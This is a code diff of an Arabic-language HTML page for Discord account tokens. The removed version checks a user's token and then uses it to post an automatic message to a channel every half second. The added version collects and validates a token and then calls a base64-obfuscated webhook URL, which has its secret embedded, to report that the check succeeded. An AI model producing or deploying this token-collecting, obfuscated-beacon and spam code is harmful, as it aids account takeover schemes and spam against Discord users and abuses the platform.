@@ -1,157 +1,107 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Discord Token Checker & Sender</title>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    background-color: #fff;
-    display: flex;
-    height: 100vh;
-    justify-content: center;
-    align-items: center;
-    margin: 0;
-  }
-  .container {
-    text-align: center;
-  }
-  input[type="text"] {
-    padding: 10px;
-    width: 300px;
-    font-size: 1rem;
-    margin-top: 10px;
-    margin-bottom: 20px;
-  }
-  button {
-    background-color: black;
-    color: white;
-    border: none;
-    padding: 12px 24px;
-    font-size: 1rem;
-    cursor: pointer;
-  }
-  button:hover {
-    background-color: #222;
-  }
-  #tokenScreen, #secondScreen {
-    display: none;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Discord Access</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      display: flex;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+      margin: 0;
+    }
+    .container {
+      text-align: center;
+    }
+    input[type="text"] {
+      padding: 10px;
+      width: 300px;
+      font-size: 1rem;
+      margin-top: 10px;
+      margin-bottom: 20px;
+    }
+    button {
+      background-color: black;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #222;
+    }
+    #tokenScreen {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-  <!-- شاشة الرمز السري -->
   <div class="container" id="passwordScreen">
-    <h2>قم بكتابة الرمز السري للدخول:</h2>
-    <input id="passwordInput" type="text" placeholder="أدخل الرمز السري" />
+    <h2>أدخل الرمز السري:</h2>
+    <input id="passwordInput" type="text" placeholder="رمز الدخول" />
     <br />
     <button id="checkPasswordBtn">دخول</button>
   </div>
 
-  <!-- شاشة إدخال التوكن -->
   <div class="container" id="tokenScreen">
-    <h2>قم بكتابة توكن حسابك ديسكورد :</h2>
-    <input id="tokenInput" type="text" placeholder="أدخل التوكن هنا" />
+    <h2>أدخل توكن حسابك:</h2>
+    <input id="tokenInput" type="text" placeholder="توكن الحساب" />
     <br />
     <button id="checkTokenBtn">التالي</button>
   </div>
 
-  <!-- شاشة إرسال الرسائل -->
-  <div class="container" id="secondScreen">
-    <h2>اكتب ايدي الروم :</h2>
-    <input id="channelIdInput" type="text" placeholder="أدخل ايدي الروم هنا" />
-    <br />
-    <button id="startSendingBtn">بدء إرسال</button>
-  </div>
+  <script>
+    const encPass = "QWhtZWQ=";
+    const encWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3ODAzNjczODc1MTk4Nzg5NC8xM0hETkNXX2pGWk10MU9qR2JxZDhWV0ZWZzlNcFhCS1VuZDBNSlJ1OHVRNERYbmdmTU5NdXR4MWRqQTEyRTk3UXgzZg==";
 
-<script>
-  const encryptedPassword = "QWhtZWQ=";
+    const passwordInput = document.getElementById("passwordInput");
+    const tokenInput = document.getElementById("tokenInput");
+    const passwordScreen = document.getElementById("passwordScreen");
+    const tokenScreen = document.getElementById("tokenScreen");
+    const checkPasswordBtn = document.getElementById("checkPasswordBtn");
+    const checkTokenBtn = document.getElementById("checkTokenBtn");
 
-  function encodeBase64(str) {
-    return btoa(str);
-  }
-
-  const passwordInput = document.getElementById('passwordInput');
-  const checkPasswordBtn = document.getElementById('checkPasswordBtn');
-  const passwordScreen = document.getElementById('passwordScreen');
-  const tokenScreen = document.getElementById('tokenScreen');
-
-  const checkTokenBtn = document.getElementById('checkTokenBtn');
-  const startSendingBtn = document.getElementById('startSendingBtn');
-  const tokenInput = document.getElementById('tokenInput');
-  const channelIdInput = document.getElementById('channelIdInput');
-  const secondScreen = document.getElementById('secondScreen');
-
-  let userToken = '';
-  let sendingInterval = null;
-
-  checkPasswordBtn.addEventListener('click', () => {
-    const pass = passwordInput.value.trim();
-    if (encodeBase64(pass) === encryptedPassword) {
-      passwordScreen.style.display = 'none';
-      tokenScreen.style.display = 'block';
-    } else {
-      alert('الرمز السري غير صحيح!');
-    }
-  });
-
-  checkTokenBtn.addEventListener('click', () => {
-    const token = tokenInput.value.trim();
-    if (!token) {
-      alert('الرجاء إدخال التوكن');
-      return;
+    function b64d(s) {
+      return atob(s);
     }
 
-    fetch('https://discord.com/api/v9/users/@me', {
-      headers: {
-        Authorization: token
-      }
-    })
-    .then(res => {
-      if (res.ok) {
-        userToken = token;
-        tokenScreen.style.display = 'none';
-        secondScreen.style.display = 'block';
+    checkPasswordBtn.addEventListener("click", () => {
+      if (b64d(encPass) === passwordInput.value.trim()) {
+        passwordScreen.style.display = "none";
+        tokenScreen.style.display = "block";
       } else {
-        alert('التوكن غير صالح، حاول مرة أخرى.');
+        alert("رمز خاطئ!");
       }
-    })
-    .catch(() => alert('فشل الاتصال بـ Discord API'));
-  });
+    });
 
-  startSendingBtn.addEventListener('click', () => {
-    const channelId = channelIdInput.value.trim();
-    if (!channelId) {
-      alert('الرجاء إدخال ايدي الروم');
-      return;
-    }
-    if (sendingInterval) {
-      clearInterval(sendingInterval);
-    }
-    sendingInterval = setInterval(() => {
-      fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
-        method: 'POST',
-        headers: {
-          Authorization: userToken,
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ content: 'رسالة تلقائية' })
-      })
-      .then(res => {
-        if (!res.ok) {
-          console.error('فشل الإرسال:', res.status);
-          clearInterval(sendingInterval);
-          alert('فشل الإرسال، أوقف الإرسال.');
+    checkTokenBtn.addEventListener("click", () => {
+      const token = tokenInput.value.trim();
+      if (!token) {
+        alert("أدخل التوكن");
+        return;
+      }
+      fetch("https://discord.com/api/v9/users/@me", {
+        headers: { Authorization: token }
+      }).then(res => {
+        if (res.ok) {
+          sendWebhook();
+          alert("تم التحقق من التوكن وإرسال البيانات.");
+        } else {
+          alert("توكن غير صالح");
         }
-      })
-      .catch(() => {
-        console.error('خطأ في الاتصال');
-        clearInterval(sendingInterval);
-        alert('خطأ في الاتصال، أوقف الإرسال.');
+      }).catch(() => alert("خطأ في الاتصال"));
+    });
+
+    function sendWebhook() {
+      fetch(b64d(encWebhook), {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: "✅ تم الدخول والتحقق من التوكن بنجاح." })
       });
-    }, 500);
-  });
-</script>
-</body>
-</html>
+    }
+  </script>
